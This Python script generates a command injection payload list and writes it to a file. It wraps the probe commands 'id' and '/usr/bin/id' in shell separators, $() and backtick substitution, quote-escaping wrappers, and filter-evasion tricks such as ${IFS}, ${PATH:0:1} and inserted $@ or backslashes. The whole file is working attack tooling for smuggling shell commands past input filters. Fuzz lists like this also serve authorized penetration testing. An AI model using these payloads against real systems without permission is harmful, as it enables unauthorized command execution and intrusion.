from urllib.parse import quote

payloads = []
command = "id"
command_path = "/usr/bin/id"
commands = [command, command_path]

commands_masked = []

# using -> $@
commands_masked += [command[0] + "$@" + command[1:]]
commands_masked += ["/"+"/".join([w[0] + "$@" + w[1:] for w in command_path.split("/") if w])]

# using backslashes
commands_masked += [command[0] + "\\" + command[1:]]
commands_masked += ["/"+"/".join([w[0] + "\\" + w[1:] for w in command_path.split("/") if w])]

# using capitalization
# commands_masked += [command.replace(command[1], command[1].upper())]
# commands_masked += ["/"+"/".join([w.replace(w[1], w[1].upper()) for w in command_path_words if w])]

# using alternative slashes
slashes_alt = ["${PATH:0:1}"]
commands_masked += [c.replace("/", slash)for slash in slashes_alt for c in commands if "/" in c]

# add masked to command list
commands += commands_masked

# space alternatives (not used)
spaces = [" ", "\t"]
spaces += [quote(x) for x in spaces]
spaces += ['${IFS}']

# shell breaker strings
cmd_prefixers = [";", "&", "&&", "|", "||"]
cmd_prefixers += [quote(x) for x in cmd_prefixers]
cmd_prefixers += ["${LS_COLORS:10:1}", quote("\n")]

# execution functions
cmd_executers = ["$(CMD)", "`CMD`"]

# loop comamnds
for command in commands:
    # loop prefixes
    for pre in cmd_prefixers:
        payloads.append(pre+command)
    # loop executers
    for executer in cmd_executers:
        payloads.append(executer.replace("CMD", command))

# use string prefixers to excape strings
string_prefixers = ['"', "'"]
string_suffixers = ["", "\\"]

string_prefixed_payloads = []
for payload in payloads:
    for prefixer in string_prefixers:
        for suffixer in string_suffixers:
            string_prefixed_payloads.append(prefixer+payload+suffixer)
payloads += string_prefixed_payloads

print("generated ", len(payloads), "payloads")

payload_string = ""
for p in payloads:
    payload_string += p+"\n"
with open("payloads.txt", "w") as file:
    file.write(payload_string)
